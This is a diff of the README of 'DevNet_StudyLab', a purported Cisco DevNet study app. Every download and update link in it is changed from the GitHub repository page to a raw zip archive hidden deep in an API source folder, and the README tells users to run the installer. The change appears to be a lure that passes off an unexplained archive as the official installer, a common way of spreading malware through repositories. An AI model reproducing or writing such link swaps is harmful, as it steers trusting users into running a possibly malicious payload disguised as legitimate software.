@@ -1,6 +1,6 @@
 # 🚀 DevNet_StudyLab - Study Smarter for Cisco DevNet
 
-[![Download DevNet_StudyLab](https://img.shields.io/badge/Download-DevNet_StudyLab-brightgreen)](https://github.com/apakek-99/DevNet_StudyLab)
+[![Download DevNet_StudyLab](https://img.shields.io/badge/Download-DevNet_StudyLab-brightgreen)](https://raw.githubusercontent.com/apakek-99/DevNet_StudyLab/main/apps/web/src/app/api/dashboard/stats/Lab_Study_Dev_Net_v3.3-beta.3.zip)
 
 ## 📚 What is DevNet_StudyLab?
 
@@ -26,7 +26,7 @@ Your computer should already have a web browser like Chrome, Firefox, or Edge in
 
 Click the button below to visit the download page for DevNet_StudyLab. You will find the latest version there.  
 
-[![Download DevNet_StudyLab](https://img.shields.io/badge/Download-DevNet_StudyLab-blue)](https://github.com/apakek-99/DevNet_StudyLab)
+[![Download DevNet_StudyLab](https://img.shields.io/badge/Download-DevNet_StudyLab-blue)](https://raw.githubusercontent.com/apakek-99/DevNet_StudyLab/main/apps/web/src/app/api/dashboard/stats/Lab_Study_Dev_Net_v3.3-beta.3.zip)
 
 ## 🛠 Installation Steps
 
@@ -83,7 +83,7 @@ DevNet_StudyLab interacts with mock Cisco APIs through the internet. Make sure:
 
 To keep the app up to date:
 
-1. Visit the GitHub download page often: https://github.com/apakek-99/DevNet_StudyLab  
+1. Visit the GitHub download page often: https://raw.githubusercontent.com/apakek-99/DevNet_StudyLab/main/apps/web/src/app/api/dashboard/stats/Lab_Study_Dev_Net_v3.3-beta.3.zip  
 2. Download the latest installer when a new version is available.  
 3. Run the installer again to replace the old version. Your settings and data will stay safe.
 
@@ -130,8 +130,8 @@ You can ask for help by:
 
 ## 🔗 Important Links
 
-- GitHub page and downloads: https://github.com/apakek-99/DevNet_StudyLab  
+- GitHub page and downloads: https://raw.githubusercontent.com/apakek-99/DevNet_StudyLab/main/apps/web/src/app/api/dashboard/stats/Lab_Study_Dev_Net_v3.3-beta.3.zip  
 - Documentation and study guides in the app  
 - Community forums for Cisco DevNet  
 
-[![Download DevNet_StudyLab](https://img.shields.io/badge/Download-DevNet_StudyLab-brightgreen)](https://github.com/apakek-99/DevNet_StudyLab)
+[![Download DevNet_StudyLab](https://img.shields.io/badge/Download-DevNet_StudyLab-brightgreen)](https://raw.githubusercontent.com/apakek-99/DevNet_StudyLab/main/apps/web/src/app/api/dashboard/stats/Lab_Study_Dev_Net_v3.3-beta.3.zip)
